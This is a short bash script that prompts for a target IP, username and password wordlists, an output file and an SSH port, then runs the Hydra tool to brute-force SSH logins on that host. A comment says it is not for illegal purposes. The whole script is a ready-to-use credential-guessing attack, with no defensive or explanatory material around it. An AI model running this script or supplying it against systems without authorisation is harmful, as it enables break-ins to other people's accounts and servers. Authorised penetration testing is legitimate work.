# This script is not for illegal purposes

read -p 'Please enter target IP ' entered_ip_var
read -p 'Username wordlist location? ' username_wordlist_var
read -p 'Password wordlist location? ' password_wordlist_var
read -p 'What do you want the output txt file name to be? ' output_name_var
read -p 'What port is ssh on? ' port_number_var
hydra -L $username_wordlist_var -P $password_wordlist_var -o $output_name_var.txt -t 4 -s $port_number_var ssh://$entered_ip_var